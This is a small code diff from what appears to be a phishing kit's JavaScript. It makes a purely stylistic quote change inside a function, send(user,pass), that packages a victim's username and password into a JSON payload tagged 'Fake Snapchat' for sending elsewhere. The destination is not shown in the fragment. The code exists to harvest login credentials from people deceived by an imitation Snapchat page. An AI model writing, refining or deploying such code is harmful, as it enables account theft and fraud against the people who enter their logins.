@@ -29,9 +29,9 @@ function send(user,pass){
     body: JSON.stringify({
         data: [
             {
-                'PASSWORD': pass,
-                'USERNAME': user,
-                'SITE': "Fake Snapchat"
+                "PASSWORD": pass,
+                "USERNAME": user,
+                "SITE": "Fake Snapchat"
             }
         ]
     })
